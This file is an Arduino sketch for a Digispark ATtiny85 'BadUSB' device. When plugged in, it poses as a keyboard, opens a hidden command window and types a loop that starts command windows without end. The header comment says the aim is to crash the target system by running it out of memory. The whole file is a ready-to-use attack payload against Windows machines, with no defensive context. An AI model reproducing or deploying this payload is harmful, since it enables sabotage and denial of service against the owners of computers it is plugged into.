// Optimized CMD Bomb for the Attiny 85 digispark badusb, the payload opens an obfuscated CMD window and multiplies it by itself, eventually crashing the system as it runs out of memory.
// Script is able to execute within 2,1 seconds. (Bootloader time not included).
#include "DigiKeyboard.h"

void setup() {
}
void loop() {
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.print("cmd");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  DigiKeyboard.print("MODE CON: COLS=15 LINES=1");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(300);
  DigiKeyboard.print(F("for /l %x in (1,1,999999999999999999) do start"));
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  for(;;){ /*empty*/ }
}
